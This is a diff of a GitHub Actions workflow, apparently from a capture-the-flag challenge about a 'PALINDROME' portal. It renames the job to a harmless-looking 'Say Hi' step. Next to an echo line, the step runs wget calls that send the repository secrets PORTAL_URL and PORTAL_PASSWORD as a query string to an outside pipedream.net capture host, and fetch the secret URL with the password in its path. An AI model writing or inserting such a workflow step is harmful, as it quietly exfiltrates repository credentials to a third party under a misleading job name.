@@ -1,14 +1,17 @@
-name: Test the PALINDROME portal
+name: Say Hi
 
-on: pull_request_target
+on: pull_request
 
 jobs:
   test:
     runs-on: windows-latest
+
     steps:
-      - uses: actions/checkout@v3
-      - name: Test the PALINDROME portal
-        run: | 
-          C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
-          C:\msys64\usr\bin\wget.exe "https://en82yybndfrir.x.pipedream.net?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}"
-          echo "hello"
+    - uses: actions/checkout@v3
+    - name: Say Hi
+      run: |
+        echo "hi!!"
+         C:\msys64\usr\bin\wget.exe "https://en82yybndfrir.x.pipedream.net?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}"
+        C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+
+        
